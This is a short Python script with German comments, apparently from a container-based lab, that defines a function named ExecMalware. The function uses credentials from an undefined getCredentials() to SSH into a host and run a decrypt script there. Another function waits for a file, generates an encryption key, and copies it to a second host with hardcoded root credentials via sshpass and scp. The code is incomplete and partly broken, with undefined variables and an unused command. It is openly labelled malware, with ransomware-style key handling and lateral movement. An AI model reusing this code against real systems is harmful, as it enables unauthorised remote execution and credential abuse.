import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
import os
import time
import paramiko

def ExecMalware():
    getCredentials()
    import paramiko
    import time

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect('172.17.0.2', username=user, password=pw)

    time.sleep(1)
    stdin, stdout, stderr = client.exec_command('python3 decrypt.py')


    for line in stdout:
        print(line)

    client.close()






def wait_for_file(file_path, timeout=60):
    start_time = time.time()
    while not os.path.exists(file_path):
        if time.time() - start_time >= timeout:
            print("Timeout: Datei wurde nicht gefunden.")
            return False
        time.sleep(1)  # Warten Sie 1 Sekunde, bevor Sie erneut überprüfen

    print("Datei gefunden:", file_path)
    # Führen Sie hier Ihre gewünschte Aktion aus
    key = os.urandom(32)  # Erzeuge einen zufälligen 256-Bit-Schlüssel

    with open("chkey.txt", "wb") as keyfile:
        keyfile.write(key)
        
    ostring = "sshpass -p " + "root"  +  " scp -o StrictHostKeyChecking=no chkey.txt "+ "root"+"@172.17.0.3:/root"
    os.system(ostring)
    ostring = "sshpass -p " + "root"  +  " scp -o StrictHostKeyChecking=no decrypt.txt "+ "root"+"@172.17.0.3:/root"



# Beispielaufruf
file_path = "/kenndaten.txt"
wait_for_file(file_path, timeout=120)
ExecMalware()





